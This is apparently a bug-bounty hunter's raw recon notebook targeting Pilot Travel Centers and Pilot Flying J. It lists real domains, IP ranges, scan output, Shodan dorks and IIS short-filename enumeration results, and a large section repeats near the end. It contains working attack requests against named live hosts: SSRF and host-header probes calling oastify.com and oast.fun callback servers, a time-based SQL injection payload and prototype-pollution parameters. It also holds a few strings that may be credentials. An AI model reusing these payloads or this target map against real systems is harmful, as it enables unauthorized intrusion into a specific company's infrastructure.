+https://extranet.pilottravelcenters.com/VendorPortal/WebResource.axd?d=2D8um6hCzDf4buMyKAP_QMDhhEhf_2v75GtGSg0dHLcwy55GumzsWQPvpc0WwQaFE9LmBBQaBubaMliD6IgZI6pyD63AU39wEojaauSWwxM1bt7qu'-ffuf-'j3wrr&t=637811441240000000
+
+
+
+
+
+
+
+if somebody says that something is impossible and it's not buypassible we are hackers and we always find a path to do things
+
+These blackbox regular expression testing is still not very touched I keep finding all these issues when I go to live hacking events it's it's always there
+
+If something is being validated and you can bypass it think about the impact and you'll see the big picture
+
+
+
+"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"
+
+
+
+
+Buypass methids
+
+
+
+https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names
+
+
+
+
+
+34 M Wordlist Subdomain Brute-Force
+Full Subdomain Enumeration
+Levels-deep Subdomain Enumeration
+
+
+Allforone
+reconftw.sh
+awscert.sh
+
+
+
+
+
+
+http://nationalpizzamonth.pilotflyingj.com/
+
+
+
+
+
+Frist Target  74.114.190.0/24  aalias 5_cidr
+
+74.114.190.25    test-okcvpn.pilotflyingj.com.
+74.114.190.214   mail12.pilottravelcenters.com.
+74.114.190.248   dns3.pilotcorp.com.
+74.114.190.249   dns4.pilotcorp.com.
+
+74.114.190.89:443  Citrix Gateway
+https://74.114.190.89/logon/LogonPoint/tmindex.html
+
+Citrix Gateway
+haw to find vershion https://github.com/fox-it/citrix-netscaler-triage
+look for do file on linkfindr on burp open all js file
+
+https://74.114.190.89/nf/auth/doNegotiate.do
+
+-------------------------------------------------------------------------------
+
+Second Target 74.114.189.0/24
+
+prips 74.114.189.0/24 |  hakrevdns
+
+74.114.189.55    as2.pilottravelcenters.com.
+74.114.189.73    mobileapps.pilotflyingj.com.
+74.114.189.73    pilot-flyingj.com.
+74.114.189.73    www.pilot-flyingj.com.
+74.114.189.73    reserve.pilotflyingj.com.
+74.114.189.73    myrewards-qa.pilotflyingj.com.
+74.114.189.73    pilottravelcenters-qa.pilotflyingj.com.
+74.114.189.73    www.pilotsurveys.com.
+74.114.189.73    pilotsurveys.com.
+74.114.189.73    www.pfjfeedback.com.
+74.114.189.73    pfjfeedback.com.
+74.114.189.73    portal-test.pilotflyingj.com.
+74.114.189.86    extranet.pilotflyingj.com.
+74.114.189.130   travelwell.pilotflyingj.com.
+74.114.189.130   rebateeducation.pilotflyingj.com.
+74.114.189.130   www.rebateeducation.pilotflyingj.com.
+74.114.189.150   connect4.pilottravelcenters.com.
+74.114.189.250   connect2.pilottravelcenters.com.
+
+
+shodan.
+
+74.114.189.73
+mobileapps.pilotflyingj.com
+www.pilotsurveys.com
+myrewards-qa.pilotflyingj.com
+pilotflyingj.com
+portal-test.pilotflyingj.com
+
+74.114.189.130
+travelwell.pilotflyingj.com
+rebateeducation.pilotflyingj.com
+www.rebateeducation.pilotflyingj.com
+
+74.114.189.73
+mobileapps.pilotflyingj.com
+pilot-flyingj.com
+www.pilot-flyingj.com
+reserve.pilotflyingj.com
+myrewards-qa.pilotflyingj.com
+
+74.114.189.55
+as2.pilottravelcenters.com
+
+
+
+
+naabu -host 74.114.189.0/24  -top-ports 1000
+
+74.114.189.73:443
+74.114.189.55:5080
+74.114.189.130:80
+74.114.189.130:443
+74.114.189.73:80
+74.114.189.55:443
+
+masscan 74.114.189.0/24 --ports 0-65535 --rate=100000 -oX 4_cidr_massful.xml
+
+
+
+
+
+
+
+
+
+
+GET http://7ea135aefd204f3b87-ke2revwibc6msuregzkqh8b5owumib.oastify.com HTTP/1.1
+Host: loyaltyportal.pilotflyingj.com
+Accept-Encoding: gzip, deflate, br
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
+
+
+
+
+
+http://myrewards.pilotflyingj.com/?utm_source=landing%20page&utm_medium=landing%20page&utm_campaign=shower%20power
+http://nationalpizzamonth.pilotflyingj.com/?amp;utm_campaign=NTLPizza&amp;utm_medium=Social&amp;utm_term=2.6.17&amp;utm_content=ProDriverFlight1
+http://nationalpizzamonth.pilotflyingj.com/?utm_campaign=NTLPizza&utm_medium=Social&utm_term=2.6.17&utm_content=ProDriverFlight1
+http://nationalpizzamonth.pilotflyingj.com/?utm_source=Facebook&amp;utm_campaign=NTLPizza&amp;utm_medium=Social&amp;utm_term=2.6.17&amp;utm_content=ProDriverFlight1
+
+http://pilotflyingj.com/?utm_campaign=Driver View&utm_source=hs_automation&utm_medium=email&utm_content=13247573&_hsenc=p2ANqtz--8l-XJvpEhR8xwtAgfJQzbkOwVAefC9-FIi7QEqBmtkymre4MBltFdy10-IQCUJAronnCA20cjMMQ-ElOd5NWQ4oDXMA&_hsmi=13247573
+
+http://pilotflyingj.com/food?utm_campaign=Food+%26+Beverage&utm_source=hs_email&utm_medium=email&utm_content=16704398&_hsenc=p2ANqtz--HVsurUfHXFLZkUicpoqroC81_7lHywG0LEoKS5k9cSun6QUyA2cPFARdRJ5qWwuJoAAYBtgxL6W1dStMHjIdAP6Lkzg&_hsmi=16704398
+http://pilotflyingj.com/national-coffee-day?utm_campaign=Coffee&utm_content=8468452&utm_medium=social&utm_source=twitter
+http://pilotflyingj.com/national-coffee-day?utm_campaign=Coffee&utm_source=hs_email&utm_medium=email&utm_content=14289678&_hsenc=p2ANqtz--nzFH34ux9roEB3iBGKFL7YjmJVtMsST-P7IRqMh9z6LN8vPfmMGFePW0of0bZ6USstZSiJBteudMSWB7msmMeBA0wnw&_hsmi=14289678
+http://pilotflyingj.com/philmor?utm_source=redirect&utm_medium=redirect&utm_term=philmormug&utm_content=philmor&utm_campaign=myphilmordotcom/robots.txt
+http://reserve.pilotflyingj.com/Location/Details/1171?utm_source=Pilot&utm_medium=YextLocationsPages
+
+https://jobs.pilotflyingj.com/?utm_source=pilot&utm_medium=YextLocationsBlock&utm_campaign=recruitment
+
+https://locations.pilotflyingj.com/us/oh/toledo/5820-hagman-road?utm_source=Pilot&utm_medium=YextAlertBanner&utm_campaign=LaneClosures
+https://loyaltyportal.pilotflyingj.com/myrewards/confirmation?token=1V_tJgGvHMjbhDdZJZ2i0AFywOzVgo5RvJRxwNHxSnmB&_branch_match_id=1306343452090145625&utm_medium=marketing&_branch_referrer=H4sIAAAAAAAAA8soKSkottLXL8jMyS9Jy6nMzEvP0kssKNDLyczL1g8N8cs2DM8MDA61L8nPTs2zNQyLL%2FFKdy%2Fz8M1KynBJifKKMso0cHSrLPevCkvPNw0q8wqqKPfzqAjOy3UCAKppM4FbAAAA
+
+
+
+https://www.pilotflyingj.com/fleet/?gclid=CjwKCAjw27jnBRBuEiwAdjQXDKa88lGoLX9TsMN-1hFXB4HIlIdYONa_sd8uRLLXfZY3MCpW2Dns0xoCqIwQAvD_BwE
+
+
+https://videorequests.pilotflyingj.com/servlet/servlet.ImageServer?id=0153c000004TP9N&oid=00D80000000bzL1&lastMod=1602444230000
+
+https://videorequests.pilotflyingj.com/s/sfsites/l/%7B%22mode%22%3A%22PROD%22%2C%22cac%22%3A0%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22fwuid%22%3A%22ZDROWDdLOGtXcTZqSWZiU19ZaDJFdzk4bkk0bVJhZGJCWE9mUC1IZXZRbmcyNDguMTAuNS01LjAuMTA%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22CMiYVlPW6pOgNvM9UnJGCw%22%7D%2C%22apce%22%3A1%2C%22apck%22%3A%22JHt0aW1lc3RhbXB9MDAwMDAwMDAwMDBlbl9VUw%22%2C%22mlr%22%3A1%2C%22pathPrefix%22%3A%22%22%2C%22dns%22%3A%22c%22%2C%22ls%22%3A1%2C%22lrmc%22%3A%22-386269907%22%7D/bootstrap.js?aura.attributes=%7B%22ac%22%3A%22%22%2C%22authenticated%22%3A%22false%22%2C%22brandingSetId%22%3A%2293b8bb8e-a48f-4ca0-b591-b37ee1e27633%22%2C%22formFactor%22%3A%22LARGE%22%2C%22isHybrid%22%3A%22false%22%2C%22language%22%3A%22en_US%22%2C%22pageId%22%3A%220f5f1962-5c39-4a48-b964-2edf8b3068f3%22%2C%22publishedChangelistNum%22%3A%2231%22%2C%22schema%22%3A%22Published%22%2C%22themeLayoutType%22%3A%22Login%22%2C%22uds%22%3A%22false%22%2C%22viewType%22%3A%22Published%22%7D
+
+https://videorequests.pilotflyingj.com/s/sfsites/l/%7B%22mode%22%3A%22PROD%22%2C%22cac%22%3A0%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22fwuid%22%3A%22ZDROWDdLOGtXcTZqSWZiU19ZaDJFdzk4bkk0bVJhZGJCWE9mUC1IZXZRbmcyNDguMTAuNS01LjAuMTA%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22CMiYVlPW6pOgNvM9UnJGCw%22%7D%2C%22apce%22%3A1%2C%22apck%22%3A%22JHt0aW1lc3RhbXB9MDAwMDAwMDAwMDBlbl9VUw%22%2C%22mlr%22%3A1%2C%22pathPrefix%22%3A%22%22%2C%22dns%22%3A%22c%22%2C%22ls%22%3A1%2C%22lrmc%22%3A%22-386269907%22%7D/resources.js?pv=1716476882000107833704&rv=1716613992000
+
+https://videorequests.pilotflyingj.com/s/login?ec=302&inst=8a&startURL=%2Fcontenthub%2F
+https://recover.pilotflyingj.com/showLogin.cc?constructor%5Bprototype%5D%5Ba42e5579%5D=yf2xy3x9&constructor.prototype.b1a3fd5b=yf2xy3x9&__proto__.ccd80966=yf2xy3x9&__proto__%5Bdcb52823%5D=yf2xy3x9
+
+
+
+
+https://privacy.pilotflyingj.com/s/sfsites/aura?r=2&aura.Component.getComponent=1&ui-communities-components-aura-components-forceCommunity-navigationMenu.NavigationMenuDataProvider.getNavigationMenu=1&ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=2&ui-force-components-controllers-hostConfig.HostConfig.getConfigData=1&ui-self-service-components-profileMenu.ProfileMenu.getProfileMenuResponse=1
+
+
+https://jobs.pilotflyingj.com/travel-center-jobs?custom_categories=Travel+Center+Jobs&location_city=Rawlins&location_state=Wyoming&page_number=1&page_size=50&sort_by=headline&sort_order=ASC
+http://blog.pilotflyingj.com/wp-json/swp_api/search?s=
+http://hubspot.pilotflyingj.com/travel-guide?portalId=339778&hsFormKey=12fdc54461cbe7a499d4479c41df20c3
+http://jobs.pilotflyingj.com/?debug=3e4edc5e4ade7278ed750502bde7eb65c16e037d
+http://jobs.pilotflyingj.com/ajax/click/track/insert/?FK1=5394107&EventID=9&EventData=&JobSource=
+
+
+
+
+https://loyaltyportal.pilotflyingj.com/myrewards/registration
+
+For this vulnerability, just type shodan title:"Check Point" ssl:"target"
+
+
+elati
+handru
+
+#5g/GGgd0xx
+
+samindunm
+
+
+#FU57/EVGss
+
+#FU57/EVGss
+
+
+
+TO_DO
+
+manual test main app
+
+with main app coockis try to acsees some 403 domains
+
+`
+
+https://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cb
+
+`
+https://click.newsletter.pilotflyingj.com/?qs=320d4bf731b62d67eb49c76ea88060e56a2cfd6ce4c00278c28ce93e5b3f05a14db028abb5b4b147c0b1236b64feb3d94ba43669b13c6a94
+
+`
+https://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cb
+
+https://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=1dc2722a7323d1d4e416926bf5937d9ca98eaa458be4ab6deb358b3cf188384095846de4f9ce728d025d72951726f5477e4c25237bab05e82d0d9c38f103cd75cf4a0bae2eecda19
+`
+https://click.newsletter.pilotflyingj.com/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx
+
+
+https://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=8e3df73589d740edde7cbdf50c81385b47136b62c928c1eebd967f13284f2c5fbb71c648452d73afd7ecf934572e0fb99603bc48f3f60a7dc95d0cf8b674fef3392ab178308c12a4
+
+
+
+
+
+
+
+http://click.newsletter.pilotflyingj.com/?qs=50ef32ecd79a805644f7feb734d1f28e464170b5e1f70fbf285650264b3b018ce1e8090fc9c8ea3a7eed468c895e84865ffd161c4cb70e8c
+
+
+
+
+
+http://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=f1e6a4e46b0a9dbca914224fdb7b19ba40667d1cc939366bb2f93b963a965eaef6e80506142ec0381a9a8c03804a1f1d915914d873ab311b4341f727d3f9d13886ef400b9acd8918
+
+
+
+http://click.newsletter.pilotflyingj.com/open.aspx?d=70176&bmt=0
+
+http://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=f7715753beb0210a4811e1995f50acb935e7f8df86478b66a7149690c82621eafe6455935f0d8dd533ff90f72b45bcbfdb02788de9e80a1bdb8705580b2d42c3f5524e096585fd7f
+
+http://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=277ee25b29247cc61dc79736f775f0a3bcba4519a8afc4524f63ddbf1bd9758689731db0d5fc26228a9ef3127cb1d5b4e6adf3f5460e59cbfe42c6f554ce756283bec9178518f796
+
+http://click.newsletter.pilotflyingj.com/?qs=02e72b733a178a3ce815ef072ddaae5d05e37eb1b33aeb8108085dd28fce56280718f1e0cdb6b0a735533c3524014f9c2279e549afc76c4c
+
+
+
+
+
+
+
+
+
+http://click.newsletter.pilotflyingj.com/?qs=02e72b733a178a3ce815ef072ddaae5d05e37eb1b33aeb8108085dd28fce56280718f1e0cdb6b0a735533c3524014f9c2279e549afc76c4c
+
+
+
+
+work fine
+
+
+
+
+https://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=1dc2722a7323d1d4e416926bf5937d9ca98eaa458be4ab6deb358b3cf188384095846de4f9ce728d025d72951726f5477e4c25237bab05e82d0d9c38f103cd75cf4a0bae2eecda19
+
+https://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cb
+
+
+https://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=8e3df73589d740edde7cbdf50c81385b47136b62c928c1eebd967f13284f2c5fbb71c648452d73afd7ecf934572e0fb99603bc48f3f60a7dc95d0cf8b674fef3392ab178308c12a4
+
+sdsamidu@7x:~/Desktop$ cat note.txt
+AS14556	ASN	Pilot Travel Centers, LLC
+
+
+cidrs_
+
+65.196.143.0/24
+70.159.149.0/24
+74.114.188.0/24
+74.114.189.0/24
+74.114.190.0/24
+_
+
+
+Scope:
+
+*.pilottravelcenters.com
+*.pilotflyingj.com	
+*.rvpluscard.com
+*.pilotcloud.net	
+*.greenamericabiofuels.com	
+*.pilotcompany.com	
+*.saratogarack.com	
+
+Customer Portal	
+Prime Parking
+com.pilottravelcenters.mypilot	Android.apk
+
+
+
+
+shodan_
+
+org:"Pilot Travel Centers  LLC"
+
+
+200 OK url 
+
+https://www.shodan.io/search?query=ssl.cert.subject.cn%3Apilotcloud.net+200+OK
+https://www.shodan.io/search?query=ssl.cert.subject.cn%3Apilotcloud.net+200+OK
+
+
+_
+
+
+
+
+
+
+
+root@nsr3b:~# shortscan https://ids.rsga.pilotcloud.net
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://ids.rsga.pilotcloud.net/
+Running: Microsoft-IIS/10.0
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+NWEBSE~1             NWEBSE?             NWEBSECCONFIG
+APP_TH~1             APP_TH?    
+WEB~1.CON            WEB.CON?   
+RESOUR~1             RESOUR?             .RESOURCES
+IDEA~1.ASP           IDEA.ASP?  
+ERROR~1.HTM          ERROR.HTM?          ERROR.HTML
+ERROR~1.ASP          ERROR.ASP? 
+IDEASU~1.ASP         IDEASU?.ASP? 
+PRECOM~1.CON         PRECOM?.CON? 
+REPORT~1.ASP         REPORT?.ASP?        REPORTVIEWERWEBFORM.ASPX
+HEALTH~1.ASP         HEALTH?.ASP?        HEALTHE-SHIELD.ASP
+REPORT~2.ASP         REPORT?.ASP?        REPORTSTATUS.ASPX
+EMPLOY~1.ASP         EMPLOY?.ASP?        EMPLOYEEMANAGEMENT.ASPX
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT_COPY%282%29.ASP
+PACKAG~1.CON         PACKAG?.CON? 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 2052; Retries: 0; Sent 413496 bytes; Received 2800915 bytes
+
+https://ids.rsga.pilotcloud.net/EMPLOYEEMANAGEMENT.ASPX
+
+
+
+
+TO_LOOK_MORE
+
+
+https://api.cp.pilotflyingj.com/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/content/FUZZ
+
+
+
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/content/blog?query=&
+X-Forwarded-Host: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+X-Host: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+X-Forwarded-Server: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+
+
+
+* do google dork and github dork for urls
+
+
+
+
+swagger-api
+
+https://digital-qa-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+https://digital-dev-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+https://digital-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+
+
+
+do sub_brute
+
+
+
+*.rightangle.private.pilotcloud.net
+*.workflowengine-qa.trips.pilotcloud.net	
+
+
+
+https://74.114.188.161/ASPNET_CLIENT/system_web/2_0_50727/
+https://74.114.188.161/ASPNET_CLIENT/SYSTEM_WEB/4_0_30319/
+https://74.114.188.161/commonfiles/OFFLINeimages/APP_OFFLINE.HTM
+
+FUELPA~1             FUELPA?    
+FUELPR~1             FUELPR?    
+RATEPF~1             RATEPF?    
+WEB~1.CON            WEB.CON?   
+RETALI~1             RETALI?    
+EFORMS~1             EFORMS?    
+EVENTR~1             EVENTR?    
+RETAIL~1             RETAIL?    
+EXE13B~1             EXE13B?    
+EXB78E~1             EXB78E?    
+EXTRAN~1             EXTRAN?    
+EX4213~1             EX4213?    
+PFJDOC~1             PFJDOC?    
+PHILAN~1             PHILAN?    
+VENDOR~2             VENDOR?    
+BIODIE~1             BIODIE?    
+BLUEBE~1             BLUEBE?    
+FUELPA~4             FUELPA?    
+FUELPA~3             FUELPA?    
+FUELPA~2             FUELPA?    
+DFSRPR~1             DFSRPR?    
+VENDOR~1             VENDOR?    
+
+DOWN_F~1.JPG         DOWN_F?.JPG? 
+EMPLOY~1             EMPLOY?    
+SURVEY~1             SURVEY?    
+ASPNET~1             ASPNET?             https://74.114.188.161/aspnet_client
+COMMON~1             COMMON?             https://74.114.188.161/commonfiles
+EXTERN~3             EXTERN?    
+EXTERN~1             EXTERN?    
+EXTERN~2             EXTERN?    
+EXTERN~4             EXTERN?    
+
+https://74.114.188.161/VENDORApplication/
+https://74.114.188.161/VENDORportal/
+
+
+
+
+
+URL: https://74.114.188.161/SURVEYexternal/
+Running: Microsoft-IIS/7.5
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+ANSWER~1             ANSWER?    
+OOPS~1.ASP           OOPS.ASP?           OOPS.ASPX
+ANONYM~1.ASP         ANONYM?.ASP? 
+SURVEY~2.CSS         SURVEY?.CSS? 
+APP_OF~1.HTM         APP_OF?.HTM? 
+SURVEY~1.CSS         SURVEY?.CSS? 
+QUESTI~1.ASC         QUESTI?.ASC? 
+SURVEY~1.ASP         SURVEY?.ASP? 
+
+
+
+
+  |_ Identified directories: 1
+    |_ ANSWER~1
+  |_ Identified files: 8
+    |_ ANONYM~1.ASP
+    |_ APP_OF~1.HTM
+    |_ OOPS~1.ASP
+      |_ Actual file name = OOPS
+    |_ QUESTI~1.ASC
+    |_ SURVEY~1.ASP
+    |_ SURVEY~1.CSS
+    |_ SURVEY~2.CSS
+    |_ WEB~1.CON
+
+
+
+
+
+
+
+
+https://74.114.188.161/SURVEYexternal/OOPS.ASPX
+
+
+
+  |_ Identified directories: 29
+    |_ ASPNET~1
+    |_ BIODIE~1
+    |_ BLUEBE~1
+    |_ COMMON~1
+    |_ DFSRPR~1
+    |_ EFORMS~1
+    |_ EMPLOY~1
+    |_ EVENTR~1
+    |_ EX4213~1
+    |_ EXB78E~1
+    |_ EXE13B~1
+    |_ EXTERN~1
+    |_ EXTERN~2
+    |_ EXTERN~3
+    |_ EXTERN~4
+    |_ EXTRAN~1
+    |_ FUELPA~1
+    |_ FUELPA~2
+    |_ FUELPA~3
+    |_ FUELPA~4
+    |_ FUELPR~1
+    |_ PFJDOC~1
+    |_ PHILAN~1
+    |_ RATEPF~1
+    |_ RETAIL~1
+    |_ RETALI~1
+    |_ SURVEY~1
+    |_ VENDOR~1
+    |_ VENDOR~2
+
+https://74.114.188.161/VENDORportal/PROPERTIES/DATASOURCES/SYSTEMS.DAT
+
+
+
+GET /pfj-loyaltymkt-one9-website-e'(select*from(select(sleep(20)))a)'/ HTTP/1.1
+Host: api.cp.pilotflyingj.com
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
+
+
+
+https://fuel.pilottravelcenters.com/
+
+                            PEGASU~1.20
+                            PEGASU~1.202
+try to find this file by ffufing
+
+/Pegasus2%20Sentinel2/
+/Pegasus2
+/PEGASUS_
+/10.20.202
+
+
+ffuf with _ and .
+
+https://fuel.pilottravelcenters.com/ASPNET_CLIENT/system_web/2_0_50727/
+https://fuel.pilottravelcenters.com/ASPNET_CLIENT/system_web/4_0_30319/
+
+
+https://github.com/dwyl/english-words
+
+
+p/App_Scripts/MicrosoftAjax.js
+p/App_Scripts/wacairspaceanimationlibrary.js
+App_Scripts/MicrosoftAjax.js
+App_Scripts/wacairspaceanimationlibrary.js
+MicrosoftAjax.js
+wacairspaceanimationlibrary.js
+
+
+
+more 
+
+https://officeonline.pilottravelcenters.com/p/RESOURCES/
+
+
+google chatgpt github twiteer
+
+
+
+URL: https://officeonline.pilottravelcenters.com/p/CLIENTBIN/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MICROS~1.XAP         MICROS?.XAP? 
+MICROS~2.XAP         MICROS?.XAP? 
+
+
+https://officeonline.pilottravelcenters.com/p/
+
+ |_ Identified directories: 8
+    |_ APP_BR~1
+    |_ APP_SC~1 app_scripts
+    |_ CLIENT~1 clientbin
+    |_ PPTRES~1 pptresources
+    |_ PPTSCR~1 pptscripts
+    |_ PPTSTA~1
+    |_ PPTTEM~1
+    |_ RESOUR~1 resources
+
+
+
+
+
+https://extranet.pilottravelcenters.com/BioDieselExternalMaintenance/backup/
+
+
+
+
+https://extranet.pilottravelcenters.com/BioDieselExternalMaintenance/
+
+https://extranet.pilottravelcenters.com/VendorPortal/WebResource.axd?d=2D8um6hCzDf4buMyKAP_QMDhhEhf_2v75GtGSg0dHLcwy55GumzsWQPvpc0WwQaFE9LmBBQaBubaMliD6IgZI6pyD63AU39wEojaauSWwxM1bt7qu'-ffuf-'j3wrr&t=637811441240000000
+
+
+
+
+
+
+
+if somebody says that something is impossible and it's not buypassible we are hackers and we always find a path to do things
+
+These blackbox regular expression testing is still not very touched I keep finding all these issues when I go to live hacking events it's it's always there
+
+If something is being validated and you can bypass it think about the impact and you'll see the big picture
+
+
+
+"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"
+
+
+
+
+Buypass methids
+
+
+
+https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names
+
+
+
+
+
+34 M Wordlist Subdomain Brute-Force
+Full Subdomain Enumeration
+Levels-deep Subdomain Enumeration
+
+
+Allforone
+reconftw.sh
+awscert.sh
+
+
+
+
+
+
+http://nationalpizzamonth.pilotflyingj.com/
+
+
+
+
+
+Frist Target  74.114.190.0/24  aalias 5_cidr
+
+74.114.190.25    test-okcvpn.pilotflyingj.com.
+74.114.190.214   mail12.pilottravelcenters.com.
+74.114.190.248   dns3.pilotcorp.com.
+74.114.190.249   dns4.pilotcorp.com.
+
+74.114.190.89:443  Citrix Gateway
+https://74.114.190.89/logon/LogonPoint/tmindex.html
+
+Citrix Gateway
+haw to find vershion https://github.com/fox-it/citrix-netscaler-triage
+look for do file on linkfindr on burp open all js file
+
+https://74.114.190.89/nf/auth/doNegotiate.do
+
+-------------------------------------------------------------------------------
+
+Second Target 74.114.189.0/24
+
+prips 74.114.189.0/24 |  hakrevdns
+
+74.114.189.55    as2.pilottravelcenters.com.
+74.114.189.73    mobileapps.pilotflyingj.com.
+74.114.189.73    pilot-flyingj.com.
+74.114.189.73    www.pilot-flyingj.com.
+74.114.189.73    reserve.pilotflyingj.com.
+74.114.189.73    myrewards-qa.pilotflyingj.com.
+74.114.189.73    pilottravelcenters-qa.pilotflyingj.com.
+74.114.189.73    www.pilotsurveys.com.
+74.114.189.73    pilotsurveys.com.
+74.114.189.73    www.pfjfeedback.com.
+74.114.189.73    pfjfeedback.com.
+74.114.189.73    portal-test.pilotflyingj.com.
+74.114.189.86    extranet.pilotflyingj.com.
+74.114.189.130   travelwell.pilotflyingj.com.
+74.114.189.130   rebateeducation.pilotflyingj.com.
+74.114.189.130   www.rebateeducation.pilotflyingj.com.
+74.114.189.150   connect4.pilottravelcenters.com.
+74.114.189.250   connect2.pilottravelcenters.com.
+
+
+shodan.
+
+74.114.189.73
+mobileapps.pilotflyingj.com
+www.pilotsurveys.com
+myrewards-qa.pilotflyingj.com
+pilotflyingj.com
+portal-test.pilotflyingj.com
+
+74.114.189.130
+travelwell.pilotflyingj.com
+rebateeducation.pilotflyingj.com
+www.rebateeducation.pilotflyingj.com
+
+74.114.189.73
+mobileapps.pilotflyingj.com
+pilot-flyingj.com
+www.pilot-flyingj.com
+reserve.pilotflyingj.com
+myrewards-qa.pilotflyingj.com
+
+74.114.189.55
+as2.pilottravelcenters.com
+
+
+
+
+naabu -host 74.114.189.0/24  -top-ports 1000
+
+74.114.189.73:443
+74.114.189.55:5080
+74.114.189.130:80
+74.114.189.130:443
+74.114.189.73:80
+74.114.189.55:443
+
+masscan 74.114.189.0/24 --ports 0-65535 --rate=100000 -oX 4_cidr_massful.xml
+
+
+
+
+
+
+
+
+
+
+GET http://7ea135aefd204f3b87-ke2revwibc6msuregzkqh8b5owumib.oastify.com HTTP/1.1
+Host: loyaltyportal.pilotflyingj.com
+Accept-Encoding: gzip, deflate, br
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
+
+
+
+
+
+http://myrewards.pilotflyingj.com/?utm_source=landing%20page&utm_medium=landing%20page&utm_campaign=shower%20power
+http://nationalpizzamonth.pilotflyingj.com/?amp;utm_campaign=NTLPizza&amp;utm_medium=Social&amp;utm_term=2.6.17&amp;utm_content=ProDriverFlight1
+http://nationalpizzamonth.pilotflyingj.com/?utm_campaign=NTLPizza&utm_medium=Social&utm_term=2.6.17&utm_content=ProDriverFlight1
+http://nationalpizzamonth.pilotflyingj.com/?utm_source=Facebook&amp;utm_campaign=NTLPizza&amp;utm_medium=Social&amp;utm_term=2.6.17&amp;utm_content=ProDriverFlight1
+
